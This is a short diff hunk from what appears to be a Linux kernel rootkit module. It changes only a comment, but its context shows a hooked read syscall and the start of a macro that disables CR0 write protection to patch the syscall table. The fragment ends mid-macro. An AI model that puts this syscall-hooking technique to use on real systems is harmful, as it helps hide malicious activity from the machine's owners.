@@ -43,7 +43,7 @@ static asmlinkage long fakeRead(int fd, char __user *buf, size_t count) {
 	return orig_read(fd, buf, count);
 }
 
-//Lemme write to syscall table real quick
+//Lemme write to syscall table real quick(courtesy of TOB)
 #define CRO_WRITE_UNLOCK(x) \
 	do { \
     	unsigned long __cr0; \
